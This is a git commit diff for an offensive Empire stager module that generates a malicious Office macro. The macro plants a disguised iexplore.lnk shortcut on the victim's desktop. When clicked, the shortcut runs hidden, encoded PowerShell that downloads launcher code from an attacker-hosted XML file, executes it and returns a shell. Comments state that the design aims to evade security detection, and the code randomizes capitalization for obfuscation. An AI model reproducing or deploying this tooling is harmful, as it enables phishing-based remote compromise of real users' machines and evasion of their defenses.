98b8a67b42d7a5611778369f5866077c62a67c39
G0ldenGun <infas532box@gmail.com>
2017-07-04 23:57:22 -0500

    update 1.1
    updated to use xml intermediary download rather than storing launcher code in a reg key

--- backdoorLnkMacro.py
+++ backdoorLnkMacro.py
@@ -1,18 +1,20 @@
 from lib.common import helpers
 
+#This is a two-step attack vector, the initial macro that a user runs will configure a shortcut on their desktop to run powershell.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute empire launcher code from an xml file hosted at a pre-defined location, which will in turn give you a shell back.  This is done to defeat application-aware security measures that flag on launches of powershell from unexpected programs, such as a direct launch from office applications.  As the macro is purely vba and does not leverage powershell the macro will not be detected. 
+
 class Stager:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'BackdoorLnkFileMacro',
+            'Name': 'BackdoorLnkFileMacroXML',
 
             'Author': ['G0ldenGun'],
 
-            'Description': ('Generates an office macro that sets up a backdoored .lnk file with an Empire .'),
+            'Description': ('Generates an office macro that sets up a backdoored .lnk file, which in turn attempts to download & execute an empire launcher when the user clicks on it. \n\nUsage: Two files will be spawned from this, a macro that should be placed in an office document and an xml that should be placed on a web server accessible by the remote system.  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),
 
             'Comments': [
-                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
+                '' 
             ]
         }
 
@@ -35,15 +37,20 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'RegPath' : {
-                'Description'   :   'Registry location to store the script code. Last element is the key name.',
+            'XmlUrl' : {
+                'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
                 'Required'      :   True,
-                'Value'         :   'HKCU:\Software\Microsoft\Windows\debug'
+                'Value'         :   "http://" + helpers.lhost() + "/netInfo.xml"
             },
             'OutFile' : {
                 'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                 'Required'      :   False,
                 'Value'         :   '/tmp/macro'
+            },
+	    'XmlOutFile' : {
+                'Description'   :   'Local path + file to output xml to.',
+                'Required'      :   True,
+                'Value'         :   '/var/www/html/netInfo.xml'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -89,8 +96,9 @@ class Stager:
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
 	lnkPath = self.options['LNKPath']['Value']
-	regPath = self.options['RegPath']['Value']
-	regParts = regPath.split("\\")
+	XmlPath = self.options['XmlUrl']['Value']
+	XmlOut = self.options['XmlOutFile']['Value']
+	regParts = XmlPath.split("\\")
 	path = "\\".join(regParts[0:len(regParts)-1])
 	name = regParts[len(regParts)-1]
 
@@ -114,20 +122,21 @@ class Stager:
 
 
             macro += "Public Function Office() As Variant\n"
-            macro += payload
+           # macro += payload
 	
-	    macro += "Dim i_RegKey As String, i_Value As String, i_Type as String\n"
 	    macro += "Dim myWS As Object, lnk as Object\n"
-	    macro += "i_Type = \"REG_SZ\"\n"
 	    macro += "Set myWS = CreateObject(\"Wscript.Shell\")\n"
 #set up first link - creates / replaces iexplore.lnk (display name iexplore) on users desktop if it sees it
 	    macro += "Set lnk = myWS.CreateShortcut(myWS.SPecialFolders(\"desktop\") & \"\\iexplore.lnk\")\n"
 	    
-	    launchString = "[System.Diagnostics.Process]::Start(\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp " + path+" " + name + ")." + name+")))\n"
+	    launchString1 = "[System.Diagnostics.Process]::Start(\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\");$b = New-Object System.Xml.XmlDocument;$b.Load(\""
+	    launchString2 = "\");[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.command.a.execute))|IEX\n"
 
 	    macro += "lnk.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"\n"
 
-
+	    launchString1 = helpers.randomize_capitalization(launchString1)
+	    launchString2 = helpers.randomize_capitalization(launchString2)
+	    launchString = launchString1 + XmlPath + launchString2
 	    encLaunch = helpers.enc_powershell(launchString)
 	    macro += "lnk.arguments = \"-w hidden -nop -enc " + encLaunch + "\"\n"
 	    macro += "lnk.IconLocation = \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\"\n"
@@ -140,14 +149,16 @@ class Stager:
 	    macro += "lnk.arguments = \"-w hidden -nop -enc " + encLaunch + "\"\n"
 	    macro += "lnk.IconLocation = \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\"\n"
 	    macro += "lnk.save\n"
+	    macro += "End Function\n"
 
+#write XML to disk
 
-#setting reg value
-	    regPath = regPath.translate(None, ':')
-	    macro += "i_Regkey = \"" + regPath +"\"\n"
-	    macro += "myWS.RegWrite i_RegKey, encRP, i_Type\n" 	    
-            
-
-            macro += "End Function\n"
+	    f = open(XmlOut,"w")
+	    f.write("<?xml version=\"1.0\"?>\n")
+	    f.write("<command>\n")
+	    f.write("\t<a>\n")
+	    f.write("\t<execute>"+launcher+"</execute>\n")
+	    f.write("\t</a>\n")
+	    f.write("</command>\n")
 
             return macro
